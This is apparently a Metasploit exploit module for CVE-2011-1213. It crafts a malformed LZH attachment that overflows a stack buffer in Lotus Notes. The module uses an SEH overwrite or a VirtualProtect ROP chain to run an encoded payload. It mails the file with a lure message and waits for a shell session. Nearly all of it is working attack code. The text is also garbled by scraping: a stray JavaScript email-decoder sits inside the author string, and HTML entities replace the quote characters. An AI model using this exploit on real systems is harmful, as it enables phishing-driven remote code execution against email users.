# $Id: lotusnotes_lzh.rb 13015 2011-06-23 15:43:54Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ManualRanking # needs client interaction and permanent listener
 
    #
    # This module sends email messages via smtp
    #
    include Msf::Exploit::Remote::SMTPDeliver
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview(.lzh attachment)&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when
                parsing a malformed, specially crafted LZH file. This vulnerability was
                discovered binaryhouse.net
 
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;binaryhouse.net&#039;,      # original discovery
                    &#039;alino <26alino@gmail.com<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s=&#039;&#039;;r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>>&#039;, # Metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 13015 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-1213&#039;],
                    [&#039;OSVDB&#039;, &#039;72706&#039;],
                    [&#039;BID&#039;, &#039;48018&#039;],
                    [&#039;URL&#039;, &#039;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=904&#039;],
                    [&#039;URL&#039;, &#039;http://www.ibm.com/support/docview.wss?uid=swg21500034&#039;],
                ],
            &#039;Stance&#039;         => Msf::Exploit::Stance::Passive,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;       => [&#039;win&#039;],
            &#039;Targets&#039;        =>
                [
                    [ &#039;Lotus Notes 8.0.x - 8.5.2 FP2 / Windows Universal&#039;,
                        {
                            &#039;Offset&#039; => 6741,
                            &#039;Ret&#039;    => 0x780c26b2 # POP ECX; POP ECX; RETN MSVCP60.dll
                        }
                    ],
                     
                    [ &#039;Lotus Notes 8.5.2 FP2 / Windows Universal / DEP&#039;,
                        {
                            &#039;Offset&#039; => 6745,
                            &#039;Ret&#039;    => 0x60dc1043 # ADD ESP,52C; XOR EAX,EAX; POP EDI; POP ESI; POP EBX; POP EBP; RETN 4 nnotes.dll
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;May 24 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                #
                # Email options
                #
                OptString.new(&#039;FILENAME&#039;,
                    [false, &#039;Sets the attachment file name&#039;, &#039;data.lzh&#039;]),
                OptString.new(&#039;MESSAGE&#039;,
                    [false, &#039;Email message text&#039;, &#039;Important message, please view attachment!&#039;])
            ], self.class)
        register_advanced_options(
            [
                OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ]),
                OptInt.new("ListenerTimeout", [ false, "The maximum number of seconds to wait for new sessions", 0])
            ], self.class)
    end
 
    def exploit
 
        header =  "\x08"        # Size of archived file header <-- 8 - 13 = FFFFFFF6
        header << "\x1a"      # 1 byte Header checksum
        header << "\xB2\x5e\xab\x3c"  # Original file date/time
        header << "\x20"      # File attribute
        header << "\x00"      # Level identifier
        header << "\x07"      # File name length
        header << "poc.txt"       # File name
 
        lzh =  header
        lzh << rand_text(target[&#039;Offset&#039;])
 
        if (target == targets[0])
 
            lzh << generate_seh_record(target.ret)
            lzh << make_nops(8)
            lzh << payload.encoded
 
        elsif (target == targets[1])
 
            rop_nop = [0x7c3c5958].pack(&#039;V&#039;) * 47 # RETN MSVCP71.dll
 
            rop_gadgets =
            [
                0x60524404, # POP EAX; RETN nnotes.dll
                0x7c37a140, # VirtualProtect()
                0x7c3a4000, # MOV EAX,DWORD PTR DS:[EAX]; RETN MSVCP71.dll
                0x603c53c1, # MOV ESI,EAX; RETN nnotes.dll
                0x60620001, # POP EBP; RETN nnotes.dll
                0x7c3c5946, # PUSH ESP; RETN MSVCP71.dll
                0x7c34280f, # POP EBX; RETN MSVCR71.dll
                0x00001954, # dwSize
                0x780ea001, # POP ECX; RETN MSVCP60.dll
                0x7c38b000, # lpflOldProtect
                0x60e73200, # POP EDI; RETN nnotes.dll
                0x60e73201, # RETN nnotes.dll
                0x601d5f02, # POP EDX; RETN nnotes.dll
                0x00000040, # flNewProtect
                0x60524404, # POP EAX; RETN nnotes.dll
                0x90909090, # NOP
                0x60820801, # PUSHAD; RETN nnotes.dll
            ].pack("V*")
 
            lzh << [target.ret].pack(&#039;V&#039;)
            lzh[32, rop_nop.length] = rop_nop
            lzh[220, rop_gadgets.length] = rop_gadgets
            lzh[289, payload.encoded.length] = payload.encoded
        end
 
        name = datastore[&#039;FILENAME&#039;] || Rex::Text.rand_text_alpha(rand(10)+1) + ".lzh"
        data = datastore[&#039;MESSAGE&#039;] || Rex::Text.rand_text_alpha(rand(32)+1)
 
        msg = Rex::MIME::Message.new
        msg.mime_defaults
        msg.subject = datastore[&#039;SUBJECT&#039;] || Rex::Text.rand_text_alpha(rand(32)+1)
        msg.to = datastore[&#039;MAILTO&#039;]
        msg.from = datastore[&#039;MAILFROM&#039;]
 
        msg.add_part(Rex::Text.encode_base64(data, "\r\n"), "text/plain", "base64", "inline")
        msg.add_part_attachment(lzh, name)
 
        send_message(msg.to_s)
 
        print_status("Waiting for a payload session (backgrounding)...")
 
        if not datastore[&#039;ExitOnSession&#039;] and not job_id
            raise RuntimeError, "Setting ExitOnSession to false requires running as a job (exploit -j)"
        end
 
        stime = Time.now.to_f
        print_status "Starting the payload handler..."
        while(true)
            break if session_created? and datastore[&#039;ExitOnSession&#039;]
            break if ( datastore[&#039;ListenerTimeout&#039;].to_i > 0 and (stime + datastore[&#039;ListenerTimeout&#039;].to_i < Time.now.to_f) )
 
            select(nil,nil,nil,1)
        end
    end
end



